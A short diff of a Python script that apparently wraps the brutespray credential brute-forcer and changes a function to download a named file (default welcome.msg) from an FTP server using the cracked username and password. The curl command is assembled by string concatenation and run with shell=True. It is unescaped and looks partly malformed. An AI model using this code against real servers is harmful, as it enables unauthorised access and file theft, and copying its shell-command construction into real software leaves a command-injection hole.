@@ -33,11 +33,11 @@ def run_brutespray(threads: int):
 	brute_out, brute_err = brute_poc.communicate()
 	# print(brute_out.decode('utf-8'))
 
-def get_ftp_files(ip, username, password):
+def get_ftp_files(ip, username, password, filename="welcome.msg"):
 	ftp_cd = "cd ftp; "
 	mkdir = "mkdir " + username + "; "
 	cd = "cd " + username + "; "
-	wget = "curl ftp://" + username + ":" + password + "@" + ip + "; -o retrieved_file;"
+	wget = "curl ftp://" + username + ":" + password + "@" + ip + "/" + filename + "; -o retrieved_file;"
 	cmd = ftp_cd + mkdir + cd + wget
 	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
 	out, err = proc.communicate()
